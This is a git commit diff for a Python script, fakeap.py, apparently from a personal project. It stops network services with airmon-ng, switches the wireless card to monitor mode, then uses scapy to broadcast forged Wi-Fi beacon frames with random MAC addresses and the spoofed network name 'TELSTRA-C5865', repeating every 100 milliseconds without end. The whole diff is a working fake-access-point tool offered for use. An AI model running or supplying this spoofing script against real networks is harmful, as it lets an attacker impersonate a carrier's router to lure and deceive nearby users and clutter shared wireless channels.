cb59420245710ba1d6279b4988f099f0a567298a
aziv1 <atruck@zivkovic.com.au>
2022-10-15 13:44:00 +1100

    Working on fake-fake-ap and going ot add a real fake-ap

--- fakeap.py
+++ fakeap.py
@@ -1,13 +1,38 @@
-import platform
+import platform as plat
+import os
+import time
+from scapy.all import *
 
-platform_system = platform.system()
-
+#ENSURE THAT YOU ARE ON LINUX
+platform_system = plat.system()
 if platform_system != "Linux":
     print("Unsuppoted OS, Quitting Now")
     quit()
 else:
-    pass
-
+    os.system("airmon-ng check kill")
+    time.sleep(5)
+    os.system("airmon-ng start wlan0")
+    
 ################
 # Start Script #
 ################
+
+from scapy.all import *
+
+# interface to use to send beacon frames, must be in monitor mode
+iface = "wlan0mon"
+# generate a random MAC address (built-in in scapy)
+sender_mac = RandMAC()
+# SSID (name of access point)
+ssid = "TELSTRA-C5865"
+# 802.11 frame
+dot11 = scapy.all.Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=sender_mac, addr3=sender_mac)
+# beacon layer
+beacon = scapy.all.Dot11Beacon()
+# putting ssid in the frame
+essid = scapy.all.Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
+# stack all the layers and add a RadioTap
+frame = scapy.all.RadioTap()/dot11/beacon/essid
+# send the frame in layer 2 every 100 milliseconds forever
+# using the `iface` interface
+sendp(frame, inter=0.1, iface=iface, loop=1)
